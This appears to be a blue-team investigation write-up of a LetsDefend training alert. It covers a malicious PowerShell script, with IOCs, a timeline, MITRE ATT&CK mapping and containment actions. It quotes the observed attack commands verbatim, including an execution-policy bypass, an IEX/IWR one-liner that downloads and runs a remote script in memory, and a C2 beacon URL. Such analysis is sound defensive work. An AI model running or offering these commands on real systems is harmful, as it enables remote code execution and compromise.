#team/blue 
**Related Notes:** [[Alert Investigation Checklist - LetsDefend]]
**Platform:** LetsDefend  
**Event ID:** 238  
**Rule:** SOC153 - Suspicious Powershell Script Executed  
**Date Investigated:** Mar 14, 2024  
**Analyst:** Void  
**Verdict:** True Positive | Contained

---

## Alert Details

| Field         | Value                                                            |
| ------------- | ---------------------------------------------------------------- |
| Event Time    | Mar 14, 2024 05:23 PM                                            |
| Hostname      | Tony                                                             |
| IP Address    | 172.16.17.206                                                    |
| File Name     | payload_1.ps1                                                    |
| File Path     | C:\Users\LetsDefend\Downloads\payload_1.ps1                      |
| File Hash     | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| AV/EDR Action | Detected                                                         |

---

## Hash and URL Reputation

|Indicator|Source|Result|
|---|---|---|
|db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0|VirusTotal|33/62 vendors flagged malicious|
|db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0|LetsDefend Threat Intel|No data|
|files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1|VirusTotal|13/91 vendors flagged malicious|
|kionagranada.com/upload/sd2.ps1|VirusTotal|4/31 vendors flagged malicious|
|91.236.116.163|Investigation|C2 beacon destination — PHP ID tracking|

> [!danger] IOCs
> 
> - **db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0** — payload_1.ps1 hash. 33/62 vendors confirmed malicious.
> - **kionagranada.com** — Secondary payload delivery domain. Hosts sd2.ps1.
> - **91.236.116.163** — Attacker C2 server. Receives beacon check-ins via HTTP with unique victim ID.
> - **https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1** — Initial payload download URL.

---

## Attack Timeline

```
Mar 14, 2024
|
|-- 12:30 AM -- Last available log entry before gap
|               All logs between 12:30 AM and 05:22 PM are absent
|               Likely result of deliberate log clearing by malware
|
|-- 05:22 PM -- Tony clicks malicious link
|               https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
|               13/91 VT vendors flag URL as malicious
|               payload_1.ps1 downloaded to C:\Users\LetsDefend\Downloads\
|
|-- 05:23 PM -- Alert triggered — Suspicious PowerShell Script Executed
|               AV/EDR detects payload_1.ps1
|               ExecutionPolicy bypass applied to run the script
|               payload_1.ps1 executes
|
|-- 05:23 PM -- Secondary payload pulled from kionagranada.com
|               IEX(IWR) downloads and executes sd2.ps1 in memory
|               4/31 VT vendors flag sd2.ps1 domain as malicious
|
|-- 05:23 PM -- C2 beacon observed
|               HTTP GET to 91.236.116.163 with unique victim GUID
|               Attacker's server registers this machine as active victim
```

---

## Malicious Commands Observed

**ExecutionPolicy Bypass and Payload Execution:**

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1'"
```

**Secondary Payload Pull:**

```powershell
"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"
```

**C2 Beacon:**

```
HTTP://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6
```

> [!info] ExecutionPolicy Bypass `Set-ExecutionPolicy -Scope Process Bypass` overrides PowerShell's script execution restrictions for the current process only. This allows unsigned and untrusted scripts to run without triggering the default execution policy block. Scoping it to the process avoids writing a persistent policy change that would be more detectable.

> [!info] IEX and IWR — In-Memory Execution `IWR` (Invoke-WebRequest) downloads sd2.ps1 from kionagranada.com. `IEX` (Invoke-Expression) executes it directly in memory without writing it to disk. This is a deliberate technique to evade file-based AV detection — no file means no hash to scan.

> [!info] C2 Beacon — PHP ID Tracking The URL `HTTP://91.236.116.163/INDEX.PHP?ID=90059C37...&SUBID=9G6CLLE6` is a C2 check-in. The GUID-style ID uniquely identifies this specific infected machine to the attacker's server. This is standard behaviour in C2 frameworks — each victim is assigned a unique ID so the attacker can track and manage multiple compromised machines simultaneously.

---

## Log Gap Analysis

> [!warning] Missing Logs — 12:30 AM to 05:22 PM No endpoint logs exist between 12:30 AM and 05:22 PM on Mar 14, 2024. This is a significant finding.
> 
> Malware commonly clears or truncates Windows event logs as a defense evasion technique to remove evidence of earlier activity. The gap preceding the payload execution strongly suggests deliberate log clearing occurred before or during the attack.
> 
> This should be treated as an indicator of prior malicious activity on this machine, not a logging system fault.

---

## Initial Access Investigation

> [!note] Initial Access — Unconfirmed No phishing email was found in available logs. No delivery mechanism prior to the payload_1.ps1 download at 05:22 PM was identified. Possible delivery vectors include:
> 
> - Phishing email deleted by the attacker or malware prior to investigation
> - Malicious advertisement or drive-by download from a compromised website
> - Direct social engineering via another channel
> 
> Initial access is not mapped in MITRE — no direct evidence supports a specific technique. This is an open finding.

---

## MITRE ATT&CK Mapping

|Tactic|Technique|ID|Evidence|
|---|---|---|---|
|Execution|User Execution: Malicious Link|T1204.001|Tony clicked payload_1.ps1 download URL at 05:22 PM — confirmed in browser history|
|Execution|Command and Scripting Interpreter: PowerShell|T1059.001|IEX/IWR pulling and executing sd2.ps1 — PowerShell used as primary execution engine|
|Defense Evasion|Impair Defenses: Disable or Modify Tools|T1562.001|Set-ExecutionPolicy -Scope Process Bypass applied before script execution|
|Defense Evasion|Indicator Removal: Clear Windows Event Logs|T1070.001|Logs absent from 12:30 AM to 05:22 PM — consistent with deliberate log clearing|
|Defense Evasion|Obfuscated Files or Information|T1027|sd2.ps1 executed entirely in memory via IEX — no file written to disk|
|Command and Control|Application Layer Protocol: Web Protocols|T1071.001|HTTP beacon to 91.236.116.163 with GUID victim ID|
|Command and Control|Ingress Tool Transfer|T1105|IWR pulling sd2.ps1 from kionagranada.com onto the machine|

> [!caution] Mapping Note Initial Access was not mapped — delivery mechanism prior to the payload download was not confirmed in available logs. Phishing is suspected but not evidenced. Log gap may be concealing earlier activity.

---

## Attacker Objective Assessment

> [!note] What the Attacker Achieved
> 
> |Objective|Result|
> |---|---|
> |Initial Payload Executed|Achieved — payload_1.ps1 ran despite AV detection|
> |ExecutionPolicy Bypass|Achieved|
> |Secondary Payload Delivered|Achieved — sd2.ps1 pulled and executed in memory|
> |C2 Beacon Established|Achieved — machine registered with attacker server|
> |Log Clearing|Likely achieved — 17-hour gap in logs|
> |Persistence|Not confirmed — not investigated due to log gap|
> |Lateral Movement|Not observed|
> 
> Multi-stage malware execution confirmed. Initial payload ran, secondary payload pulled in memory, C2 beacon sent. The log gap suggests earlier activity may have occurred that is not visible in this investigation.

---

## Actions Taken

- Alert classified as True Positive
- Tony's machine (172.16.17.206) contained immediately
- IOCs blocked at perimeter:
    - 91.236.116.163
    - kionagranada.com
    - files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1
- Log gap escalated for separate investigation — possible prior compromise
- Persistence investigation recommended — log gap prevents confirmation from available data

> [!danger] Containment Rationale C2 beacon confirmed. Attacker's server has registered Tony's machine as an active victim. Secondary payload executed in memory — full scope of sd2.ps1 activity is unknown without memory forensics. Log gap suggests deliberate clearing of evidence. Treat as full compromise until forensic analysis proves otherwise.

---

## Key Learnings

> [!note] Lessons from This Case
> 
> 1. IEX combined with IWR is a standard in-memory execution technique — no file on disk means no hash to detect, making it a deliberate AV evasion choice
> 2. ExecutionPolicy bypass scoped to the process avoids persistent policy changes that would be more visible — always check the scope when you see this command
> 3. A GUID in a C2 URL is a victim tracking mechanism — each machine gets a unique ID so the attacker can manage multiple compromised hosts
> 4. A log gap is a finding in itself — 17 hours of missing logs on a compromised machine is consistent with deliberate clearing and should be escalated, not ignored
> 5. AV/EDR detecting a file does not mean the attack failed — payload_1.ps1 was detected but still executed. Detection and prevention are different outcomes
> 6. Multi-stage payloads exist specifically to complicate investigation — the first payload pulls the second, which runs in memory, making full scope analysis dependent on memory forensics

---

## References

- [MITRE T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE T1562.001 — Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
- [MITRE T1070.001 — Clear Windows Event Logs](https://attack.mitre.org/techniques/T1070/001/)
- [MITRE T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE T1071.001 — Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [MITRE T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)

---
